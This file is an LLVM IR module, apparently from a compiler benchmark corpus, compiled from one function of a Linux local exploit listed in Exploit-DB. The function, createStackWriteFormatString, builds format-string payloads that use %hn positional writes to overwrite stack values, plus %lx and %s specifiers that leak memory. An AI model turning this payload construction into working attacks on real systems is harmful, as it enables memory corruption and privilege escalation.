; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43775.c_createStackWriteFormatString.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43775.c_createStackWriteFormatString.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [15 x i8] c"%%1$%1$d.%1$ds\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"%%%d$hn\00", align 1
@.str.2 = private unnamed_addr constant [28 x i8] c"%%1$%d.%ds%%1$s%%1$s%%%d$hn\00", align 1
@.str.3 = private unnamed_addr constant [48 x i8] c"%%1$s%%1$s%%1$s%%1$s%%1$s%%1$s%%1$%d.%ds%%%d$hn\00", align 1
@.str.4 = private unnamed_addr constant [89 x i8] c"-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @createStackWriteFormatString(i8* %0, i32 %1, i32 %2, i8* %3, i32 %4, i8* %5, i16* %6, i32 %7) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i16*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i8* %3, i8** %12, align 8
  store i32 %4, i32* %13, align 4
  store i8* %5, i8** %14, align 8
  store i16* %6, i16** %15, align 8
  store i32 %7, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 -1, i32* %18, align 4
  store i32 0, i32* %19, align 4
  br label %24

24:                                               ; preds = %108, %8
  %25 = load i32, i32* %19, align 4
  %26 = icmp slt i32 %25, 65536
  br i1 %26, label %27, label %109

27:                                               ; preds = %24
  store i32 65536, i32* %19, align 4
  store i32 0, i32* %20, align 4
  br label %28

28:                                               ; preds = %49, %27
  %29 = load i32, i32* %20, align 4
  %30 = load i32, i32* %16, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %52

32:                                               ; preds = %28
  %33 = load i16*, i16** %15, align 8
  %34 = load i32, i32* %20, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i16, i16* %33, i64 %35
  %37 = load i16, i16* %36, align 2
  %38 = zext i16 %37 to i32
  store i32 %38, i32* %21, align 4
  %39 = load i32, i32* %21, align 4
  %40 = load i32, i32* %18, align 4
  %41 = icmp sgt i32 %39, %40
  br i1 %41, label %42, label %48

42:                                               ; preds = %32
  %43 = load i32, i32* %21, align 4
  %44 = load i32, i32* %19, align 4
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %46, label %48

46:                                               ; preds = %42
  %47 = load i32, i32* %21, align 4
  store i32 %47, i32* %19, align 4
  br label %48

48:                                               ; preds = %46, %42, %32
  br label %49

49:                                               ; preds = %48
  %50 = load i32, i32* %20, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %20, align 4
  br label %28

52:                                               ; preds = %28
  %53 = load i32, i32* %18, align 4
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

55:                                               ; preds = %52
  store i32 0, i32* %18, align 4
  br label %56

56:                                               ; preds = %55, %52
  %57 = load i32, i32* %18, align 4
  %58 = load i32, i32* %19, align 4
  %59 = icmp ne i32 %57, %58
  br i1 %59, label %60, label %75

60:                                               ; preds = %56
  %61 = load i8*, i8** %9, align 8
  %62 = load i32, i32* %10, align 4
  %63 = load i32, i32* %19, align 4
  %64 = load i32, i32* %18, align 4
  %65 = sub nsw i32 %63, %64
  %66 = call i32 (i8*, i32, i8*, i32, ...) @snprintf(i8* %61, i32 %62, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i32 %65)
  store i32 %66, i32* %17, align 4
  %67 = load i32, i32* %17, align 4
  %68 = load i8*, i8** %9, align 8
  %69 = sext i32 %67 to i64
  %70 = getelementptr inbounds i8, i8* %68, i64 %69
  store i8* %70, i8** %9, align 8
  %71 = load i32, i32* %17, align 4
  %72 = load i32, i32* %10, align 4
  %73 = sub nsw i32 %72, %71
  store i32 %73, i32* %10, align 4
  %74 = load i32, i32* %19, align 4
  store i32 %74, i32* %18, align 4
  br label %75

75:                                               ; preds = %60, %56
  store i32 0, i32* %22, align 4
  br label %76

76:                                               ; preds = %105, %75
  %77 = load i32, i32* %22, align 4
  %78 = load i32, i32* %16, align 4
  %79 = icmp slt i32 %77, %78
  br i1 %79, label %80, label %108

80:                                               ; preds = %76
  %81 = load i16*, i16** %15, align 8
  %82 = load i32, i32* %22, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i16, i16* %81, i64 %83
  %85 = load i16, i16* %84, align 2
  %86 = zext i16 %85 to i32
  %87 = load i32, i32* %19, align 4
  %88 = icmp eq i32 %86, %87
  br i1 %88, label %89, label %104

89:                                               ; preds = %80
  %90 = load i8*, i8** %9, align 8
  %91 = load i32, i32* %10, align 4
  %92 = load i32, i32* %13, align 4
  %93 = load i32, i32* %22, align 4
  %94 = add nsw i32 %92, %93
  %95 = add nsw i32 %94, 1
  %96 = call i32 (i8*, i32, i8*, i32, ...) @snprintf(i8* %90, i32 %91, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i32 %95)
  store i32 %96, i32* %17, align 4
  %97 = load i32, i32* %17, align 4
  %98 = load i8*, i8** %9, align 8
  %99 = sext i32 %97 to i64
  %100 = getelementptr inbounds i8, i8* %98, i64 %99
  store i8* %100, i8** %9, align 8
  %101 = load i32, i32* %17, align 4
  %102 = load i32, i32* %10, align 4
  %103 = sub nsw i32 %102, %101
  store i32 %103, i32* %10, align 4
  br label %104

104:                                              ; preds = %89, %80
  br label %105

105:                                              ; preds = %104
  %106 = load i32, i32* %22, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %22, align 4
  br label %76

108:                                              ; preds = %76
  br label %24

109:                                              ; preds = %24
  %110 = load i8*, i8** %14, align 8
  %111 = ptrtoint i8* %110 to i32
  %112 = sub nsw i32 %111, 18
  %113 = and i32 %112, 65535
  store i32 %113, i32* %23, align 4
  %114 = load i8*, i8** %9, align 8
  %115 = load i32, i32* %10, align 4
  %116 = load i32, i32* %23, align 4
  %117 = load i32, i32* %23, align 4
  %118 = load i32, i32* %13, align 4
  %119 = call i32 (i8*, i32, i8*, i32, ...) @snprintf(i8* %114, i32 %115, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0), i32 %116, i32 %117, i32 %118)
  store i32 %119, i32* %17, align 4
  %120 = load i32, i32* %17, align 4
  %121 = load i8*, i8** %9, align 8
  %122 = sext i32 %120 to i64
  %123 = getelementptr inbounds i8, i8* %121, i64 %122
  store i8* %123, i8** %9, align 8
  %124 = load i32, i32* %17, align 4
  %125 = load i32, i32* %10, align 4
  %126 = sub nsw i32 %125, %124
  store i32 %126, i32* %10, align 4
  %127 = load i8*, i8** %12, align 8
  %128 = ptrtoint i8* %127 to i32
  %129 = load i32, i32* %23, align 4
  %130 = add nsw i32 %129, 56
  %131 = sub nsw i32 %128, %130
  %132 = and i32 %131, 65535
  store i32 %132, i32* %23, align 4
  %133 = load i8*, i8** %9, align 8
  %134 = load i32, i32* %10, align 4
  %135 = load i32, i32* %23, align 4
  %136 = load i32, i32* %23, align 4
  %137 = load i32, i32* %11, align 4
  %138 = call i32 (i8*, i32, i8*, i32, ...) @snprintf(i8* %133, i32 %134, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.3, i64 0, i64 0), i32 %135, i32 %136, i32 %137)
  store i32 %138, i32* %17, align 4
  %139 = load i32, i32* %17, align 4
  %140 = load i8*, i8** %9, align 8
  %141 = sext i32 %139 to i64
  %142 = getelementptr inbounds i8, i8* %140, i64 %141
  store i8* %142, i8** %9, align 8
  %143 = load i32, i32* %17, align 4
  %144 = load i32, i32* %10, align 4
  %145 = sub nsw i32 %144, %143
  store i32 %145, i32* %10, align 4
  %146 = load i8*, i8** %9, align 8
  %147 = load i32, i32* %10, align 4
  %148 = load i32, i32* %11, align 4
  %149 = load i32, i32* %13, align 4
  %150 = sub nsw i32 %149, 1
  %151 = load i32, i32* %13, align 4
  %152 = load i32, i32* %13, align 4
  %153 = add nsw i32 %152, 1
  %154 = load i32, i32* %13, align 4
  %155 = add nsw i32 %154, 2
  %156 = load i32, i32* %13, align 4
  %157 = add nsw i32 %156, 3
  %158 = load i32, i32* %13, align 4
  %159 = add nsw i32 %158, 4
  %160 = load i32, i32* %13, align 4
  %161 = add nsw i32 %160, 5
  %162 = load i32, i32* %13, align 4
  %163 = add nsw i32 %162, 6
  %164 = call i32 (i8*, i32, i8*, i32, ...) @snprintf(i8* %146, i32 %147, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.4, i64 0, i64 0), i32 %148, i32 %150, i32 %151, i32 %153, i32 %155, i32 %157, i32 %159, i32 %161, i32 %163)
  store i32 %164, i32* %17, align 4
  %165 = load i32, i32* %17, align 4
  %166 = load i8*, i8** %9, align 8
  %167 = sext i32 %165 to i64
  %168 = getelementptr inbounds i8, i8* %166, i64 %167
  store i8* %168, i8** %9, align 8
  %169 = load i32, i32* %17, align 4
  %170 = load i32, i32* %10, align 4
  %171 = sub nsw i32 %170, %169
  store i32 %171, i32* %10, align 4
  ret void
}

declare dso_local i32 @snprintf(i8*, i32, i8*, i32, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
